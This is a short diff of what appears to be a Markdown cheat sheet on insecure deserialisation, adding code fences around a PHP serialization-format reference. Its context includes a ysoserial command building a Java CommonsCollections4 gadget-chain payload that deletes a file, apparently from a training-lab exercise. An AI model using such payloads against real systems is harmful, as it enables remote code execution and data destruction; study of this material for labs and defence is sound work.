@@ -418,13 +418,14 @@ Payload:
 
 # INSECURE DESERIALISATION
 ## PHP
+```
 `String -> s:size:value;`
 `Integer -> i:value;`
 `Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')`
 `Null -> N;`
 `Array -> a:size:{key definition;value definition;(repeated per element)}`
 `Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}`
-
+```
 ## Java
 ```
 java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
